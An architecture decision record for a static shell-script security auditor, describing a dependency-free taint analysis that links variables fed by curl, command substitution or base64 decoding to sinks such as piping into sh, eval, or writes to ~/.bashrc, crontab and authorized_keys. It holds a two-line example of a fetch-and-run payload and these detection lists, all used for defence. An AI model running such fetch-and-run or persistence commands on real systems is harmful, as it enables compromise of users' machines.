# ADR-006: T1 tier — dependency-free intra-file shell taint/dataflow analysis

**Status:** Accepted
**Date:** 2026-06-06
**Roadmap item:** ROADMAP R9b (T1 deterministic dataflow/taint detection for bundled scripts)
**Spawning agent:** lifecycle-orchestrator (embodying handler-architect) at run top
**Supersedes/extends:** ADR-001 (pure-scan-core / never-execute), ADR-004 (tier-pluggable rule
record), ADR-005 (external declarative ruleset). All three boundaries are **unchanged**: the pure
core never executes audited content, the `Rule` record is the tier-pluggable extension point ADR-004
designed, and the ruleset stays declarative DATA selecting a closed registry of vetted builtins.

## Context

R9a/R4 detection is **single-line**: every `dangerous-bash` rule is a per-line regex that fires (or
not) on one line in isolation (`compileLinePattern` splits on `\n` and tests each line). This misses
the most common real-world obfuscation in bundled shell scripts — a payload **split across lines**:

```sh
URL=$(get_secret)          # line A: a tainted SOURCE captured into a variable
curl "$URL" | sh           # line B: the variable flows into a dangerous SINK
```

Neither line alone matches `dangerous-bash/curl-pipe-to-shell` (line B pipes `curl "$URL"` — a
*variable*, not a literal remote URL the regex is anchored on) and the existing rules provably do not
flag it (proven by a test). The same evasion assembles a base64 blob into a variable over several
lines, then pipes the decoded variable to `sh`. The single-line regex tier (T0) cannot see the
dataflow because it has no cross-line state.

`doc/research/deeper-detection-plan.md` §3 names this the **T1 tier**: "AST + interprocedural
dataflow for bundled scripts: track tainted input → dangerous sink *without executing*, catching what
regex misses." §7 binds three decisions: deterministic default, no runtime LLM/network dependency,
and the engine must stay tier-pluggable for a future opt-in tier **without rework**.

The load-bearing questions this ADR records:

1. **What tier shape carries T1** so it plugs into the ADR-004 record without reshaping `Rule`, the
   engine, or any existing rule?
2. **Do we need an external parser** (a shell/JS AST library) to do dataflow, or can a deterministic
   intra-file taint analysis be done **dependency-free** — and if a parser is genuinely required for a
   sub-case, what is in scope for R9b vs deferred?

## Decision

### 1 · T1 is a new value of the existing `RuleTier` union — the ADR-004 extension point, used as designed

Widen `RuleTier` from `'T0'` to `'T0' | 'T1'`. That is the **entire** type change ADR-004 promised:
"Adding T2 later is: (1) widen the `RuleTier` union, (2) author rules that set the new tier, (3) …".
T1 is exactly that move. Specifically:

- **No opt-in gate.** Unlike the still-hypothetical T2 (semantic/LLM, which *breaks* offline +
  deterministic and therefore must be opt-in), **T1 is deterministic + offline + never-executing** —
  it is a *deeper static technique*, not a different trust class. So T1 rules run **always, alongside
  T0**, in the default ruleset. T0 stays the default floor and is unchanged; T1 is **additive**.
- **The tier is data on the rule, not a code branch.** The engine (`scan`) still iterates rules
  uniformly and copies `rule.tier` onto each `Finding`. A T1 finding is labelled `tier:'T1'` and
  carries OWASP + ATLAS ids exactly like a T0 finding (ADR-004 framework invariant is preserved — the
  required `framework` field still makes mapping coverage a compile-time invariant for T1 rules too).
- **No change to `Rule`, `Finding`, the engine, the compiler, the reporters, or any existing rule.**
  The reporters already print `tier ${f.tier}`; they print `T1` for free.

### 2 · The taint analysis is a new `builtin` structural matcher — DATA still selects it by name

T1 dataflow cannot be a `line-pattern` (it is inherently multi-line and stateful), so it joins the
**closed registry of named builtins** (`src/core/matchers/builtins.ts`, ADR-005). A new builtin
`shell-taint-to-sink` is added to `BuiltinMatcherName`; a contributor selects it from rule DATA by
name (`{ kind: 'builtin', name: 'shell-taint-to-sink' }`) and **cannot define new taint logic in
data** — adding/altering the analyzer is a vetted code change. This keeps the ADR-005 security
boundary intact (rule data is inert; the builtin is the only place the logic lives).

### 3 · The taint analyzer is DEPENDENCY-FREE — line/token-structured, NOT an external parser

**Zero new runtime dependencies.** The analyzer (`src/core/matchers/shell-dataflow.ts`) is a pure
function over `FileRecord.content` that:

1. **Splits the script into lines** and lightly tokenises each line (shell-aware: respects `#`
   comments, simple quoting, `$(...)`/backtick command-substitution spans, `|` pipelines, and
   `VAR=...` / `export VAR=...` / `read VAR` / `local VAR=...` assignments). This is a *structured
   scan*, not a full shell grammar — it recognises the handful of shapes taint flows through, which is
   all the SINK-reachability question needs.
2. **Seeds a taint set** with any variable whose assignment RHS contains a tainted **SOURCE**:
   command substitution `$(...)` / backticks, a network fetch (`curl`/`wget`/`fetch`), a `base64
   -d`/`xxd`/`openssl ... -d` decode, an env-var read of a sensitive name, or `read` from stdin.
3. **Propagates taint** line by line: an assignment whose RHS references an already-tainted variable
   (`$VAR`/`${VAR}`) becomes tainted (transitive, intra-file, top-to-bottom — a deterministic
   single forward pass; no fixpoint needed for straight-line scripts, and we conservatively treat any
   later re-read as tainted once seeded).
4. **Reports a finding at the SINK line** when a tainted variable reaches a **dangerous SINK**:
   piping into `sh`/`bash`/`zsh`, `eval`, `exec`, `source`/`.` of a tainted target, or writing a
   tainted value into an **autorun location** (`~/.bashrc`, `~/.profile`, `crontab`, a `systemd`
   unit, `authorized_keys`). The finding cites the **sink line** (`file:line`) — where the danger
   actually fires — with an excerpt naming the tainted variable.

Why dependency-free is *sufficient and correct* for R9b's scope:

- The SINK-reachability question for **bundled install/hook shell scripts** is dominated by
  straight-line variable assignment and pipelines — exactly the shapes a line/token scan captures.
  A heavy POSIX-shell AST parser (e.g. `mvdan/sh`, `tree-sitter-bash`) would add a runtime dependency
  to a **security auditor's own dependency tree** — itself attack surface — for marginal recall on
  control-flow constructs that an attacker gains nothing from hiding behind in a static-only auditor.
  This mirrors the standing posture (ADR-002/003/004/005 each rejected a dependency: `ignore`,
  `badge/svg`, a YAML parser). A security tool's smallest possible trusted dependency surface is
  load-bearing trust, not ergonomics.

### What is DEFERRED (and why it is NOT added now)

- **JS / TypeScript bundled-script AST dataflow** (e.g. a malicious `*.js`/`*.mjs` postinstall that
  assembles a payload via string concatenation then `eval`s it) genuinely benefits from a real JS AST
  parser to track dataflow precisely. A JS parser is a **non-trivial runtime dependency**. Per the
  binding constraint, **we do NOT add it.** R9b is scoped to the **dependency-free shell-script
  dataflow that IS achievable**. JS-AST taint is recorded here as a **deferred, opt-in future slice**
  (provisionally **R9c**): if and when it is built, the parser is an *adapter*-layer concern (like
  `acquire`/`enumerate`), never imported into `core/*`, and it ships behind an explicit tier/flag —
  the same edge-gating ADR-004 prescribes for a tier with a dependency. It is **not** required for the
  R9b value (catching multi-line shell obfuscation single-line regex misses).
- **Inter-file / inter-procedural** flow (a SOURCE in `lib.sh` reaching a SINK in `install.sh` via
  `source lib.sh`) is out of scope: R9b is **intra-file** taint, matching the research-plan wording
  for this slice. Deferred to the same future slice.

### Never-execute, preserved structurally (the trust core)

The analyzer operates **entirely in pure string space**: it reads `file.content`, splits/tokenises
strings, and matches patterns. It **never** passes any part of the script to a shell, `eval`,
`Function`, `child_process`, or any execution sink. Decoding a base64 SOURCE for *recognition* is not
performed at all — R9b only needs to know a value is *tainted by a decode*, not what it decodes to —
so there is not even a decode step to misuse. `core/*` continues to import only `core/types` and
never `node:fs`/`node:child_process` (ADR-001). The analyzer completing at all is itself proof
nothing in the script ran.

### Precision budget (the FP discipline, ADR-005)

The T1 rule ships with `passFixtures` (benign multi-step scripts — a pinned, hash-verified download;
a build script; an env-var that never reaches a sink) and `failFixtures` (the split-across-lines
payloads), and a `precisionBudget` of `0` against the benign corpus, enforced mechanically by the
existing `precision-budget.test.ts` guard (no new guard needed — the T1 rule is just another
`RuleSpec`). New **benign near-miss** corpus fixtures (a legitimate hash-verified asset download; a
tainted var that is only `echo`'d, never sunk) hold the precision line.

## Consequences

| Layer | Path | Change |
|---|---|---|
| Tier union | `src/core/types.ts` | `RuleTier = 'T0' | 'T1'`; new `BuiltinMatcherName` member `'shell-taint-to-sink'`; new `DetectionClass` member `'dataflow-taint'` |
| Analyzer | `src/core/matchers/shell-dataflow.ts` (new) | the dependency-free intra-file taint analyzer (pure) |
| Builtin registry | `src/core/matchers/builtins.ts` | register `shell-taint-to-sink` → the analyzer (scoped to `script`/`hook`) |
| Rule DATA | `src/core/rules/dataflow-taint.rules.ts` (new) | the T1 `RuleSpec[]` selecting the builtin, with fixtures + framework ids |
| Ruleset | `src/core/ruleset.ts` | include the T1 rule data; bump `RULESET_VERSION` |
| Corpus | `tests/corpus/malicious/mal-dataflow-*`, `tests/corpus/benign/ben-*` (new) | multi-line malicious + benign near-miss fixtures + manifest entries |

### No new runtime dependency

The analyzer uses only string/regex operations on in-memory content. **Zero runtime dependencies
added** — consistent with ADR-002/003/004/005 and the FOSS/no-backend thesis. The only dependency
that *would* have been needed (a JS/shell AST parser) is explicitly **not** added; the JS-AST case is
deferred to a future opt-in slice.

### Self-scan

The new rule-DATA file falls under the existing `src/core/rules/**` exclusion in
`.skillsentryignore`; the new analyzer falls under `src/core/matchers/**`; the new corpus fixtures
fall under `tests/corpus/**`. The shipped exclusion globs already cover them — **no
`.skillsentryignore` change is required** and `skillsentry .` stays PASS (verified in the STORY step).

### Rejected alternatives

- **Add a shell-grammar AST parser (`mvdan/sh` via WASM, `tree-sitter-bash`)** — rejected: a runtime
  dependency in a security auditor's own tree for marginal recall over the dependency-free
  line/token scan, which already catches the in-scope multi-line obfuscation. Violates the standing
  zero-runtime-dep posture and the binding R9b constraint.
- **Make T1 an opt-in `--tier t1` flag** — rejected: opt-in is the *T2* contract (because T2 breaks
  offline/deterministic). T1 keeps every default guarantee, so gating it behind a flag would only
  *hide* a strictly-better static detection by default, weakening the tool for no safety reason. T1
  runs always; it is merely *labelled* per finding.
- **Bolt cross-line state onto `compileLinePattern`** — rejected: it would smuggle stateful,
  multi-line behaviour into the "one regex per line" matcher whose simplicity is its safety argument.
  A distinct named builtin keeps each matcher's contract honest (ADR-005).
- **Build the JS-AST taint case now** — rejected per the binding constraint: it requires a runtime
  parser dependency. Deferred to an opt-in future slice; recorded above.

## Downstream instructions

- TEST-AGENT: add malicious multi-line corpus fixtures (split-source-to-sink curl-pipe; base64 var
  assembled then piped to sh; a tainted value written to an autorun location) → each BLOCKs citing
  `dataflow-taint` at the **sink** `file:line` with `tier:'T1'` + OWASP/ATLAS. Add benign near-miss
  fixtures (pinned hash-verified download; tainted var only echoed) → PASS. Add a **T0-misses /
  T1-catches proof** coordinate: assert the T0-only ruleset produces ZERO findings on the split
  payload while the T1 builtin produces ≥1. Unit-pin the analyzer as a pure coordinate (sources, sink
  kinds, propagation, comment/quote handling, benign non-flow).
- IMPLEMENT-AGENT: widen `RuleTier`; add the analyzer in pure string space (never an exec sink); add
  the builtin and the T1 rule DATA; bump `RULESET_VERSION`. `core/*` imports only `core/types`.
- STORY-AGENT: prove through the built CLI that the multi-line malicious fixtures BLOCK citing
  `tier T1` + sink file:line + OWASP/ATLAS, the benign near-misses PASS, the full corpus stays 100%
  accuracy / 0% FP, and `skillsentry .` on this repo stays PASS.

## Revision history

| Date | Change | Reason |
|---|---|---|
| 2026-06-06 | Initial decision | FOUNDRY cycle R9b — T1 dependency-free shell taint/dataflow tier |
